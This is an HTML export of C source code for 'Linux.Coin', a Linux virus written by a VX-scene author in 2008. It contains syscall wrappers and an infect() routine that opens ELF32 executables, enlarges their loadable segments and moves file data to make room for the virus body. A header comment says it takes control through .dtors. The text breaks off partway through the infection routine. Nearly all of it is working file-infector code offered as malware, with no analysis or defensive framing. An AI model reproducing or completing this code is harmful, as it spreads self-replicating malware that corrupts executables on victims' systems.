<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* Linux.Coin (x) herm1t@vx.netlux.org, feb 2008 */</span><span class="sc0">
</span><span class="sc1">/* 2008-07-25 fixed */</span><span class="sc0">
</span><span class="sc1">/* 2008-05-05 gain control via .dtors */</span><span class="sc0">
</span><span class="sc9">#include &lt;stdint.h&gt;
#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;asm/unistd.h&gt;
</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">".globl _start"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"fake_host: mov $1,%eax; int $0x80"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"_start: push $fake_host; call caveat; ret"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#define NULL        ((void*)0)
#define ASM     asm volatile
#define _SC(r,NR)   "push %1\npop %%eax\nint $0x80":"=a"(r):"i"(NR)
#define syscall0(NR)            \
({int r;ASM(_SC(r,NR));r; })
#define syscall1(NR,a)          \
({int r;ASM(_SC(r,NR),"b"((int)(a)));r;})
#define syscall2(NR,a,b)        \
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)));r;})
#define syscall3(NR,a,b,c)      \
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)));r;})
</span><span class="sc0">
</span><span class="sc9">#define syscall4(NR,a,b,c,d)        \
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)),"S"((int)(d)));r;})
</span><span class="sc0">
</span><span class="sc9">#define syscall6(NR,a,b,c,d,e,f)    \
({int r;ASM("push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp"  \
        :"=a"(r):"i"(NR),"b"((int)(a)), \
    "c"((int)(b)),"d"((int)(c)),"S"((int)(d)),"D"((int)(e)),"0"((int)(f)));r;})
#define exit(a)         syscall1(1,  a)
#define read(a,b,c)     syscall3(3,  a,b,c)
#define write(a,b,c)        syscall3(4,  a,b,c)
#define open(a,b)       syscall2(5,  a,b)
#define close(a)        syscall1(6,  a)
#define creat(a,b)      syscall2(8,  a,b)
#define time(a)         syscall1(13, a)
#define lseek(a,b,c)        syscall3(19, a,b,c)
#define rename(a,b)     syscall2(38, a,b)
#define readdir(a,b)        syscall2(89, a,b)
#define munmap(a,b)     syscall2(91, a,b)
#define ftruncate(a,b)      syscall2(93, a,b)
#define mprotect(a,b,c)     syscall3(125,a,b,c)
#define mremap(a,b,c,d)     syscall4(163,a,b,c,d)
#define mmap(a,b,c,d,e,f)   syscall6(192,a,b,c,d,e,f)
</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">*(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">dst</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">src</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">memmove</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dst_void</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src_void</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dst</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dst_void</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">src_void</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">src</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">dst</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">dst</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">src</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">dst</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">len</span><span class="sc10">--)</span><span class="sc0">
            </span><span class="sc10">*--</span><span class="sc11">dst</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*--</span><span class="sc11">src</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">len</span><span class="sc10">--)</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc11">dst</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">s1</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s2</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">s1</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">s2</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">s1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s1</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s1</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">self</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uint8_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">_start</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">virus_end</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">_start</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PROT_READ</span><span class="sc10">|</span><span class="sc11">PROT_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAP_SHARED</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">uint32_t</span><span class="sc10">)</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xfffff000</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">ehdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">*)</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">uint32_t</span><span class="sc10">*)</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x464c457f</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
    </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_EXEC</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
    </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_386</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
    </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_version</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EV_CURRENT</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
    </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc11">EI_OSABI</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFOSABI_NONE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">error2</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error1</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc1">/* find loadable segments and check 'em */</span><span class="sc0">
    </span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">*)(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc10">);</span><span class="sc0">    
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ok</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
           </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_memsz</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">ok</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uint32_t</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ve</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">;</span><span class="sc0">    
        </span><span class="sc11">vo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ve</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4096</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">4095</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">dp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc4">4095</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error2</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* update program headers */</span><span class="sc0">
    </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_paddr</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* PHT */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">;</span><span class="sc0">    
        </span><span class="sc1">/* make hole */</span><span class="sc0">
            </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mremap</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc1">/*MREMAP_MAYMOVE*/</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">uint32_t</span><span class="sc10">)</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xfffff000</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">memmove</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">*)</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* update section headers and patch .dtors/.jcr */</span><span class="sc0">
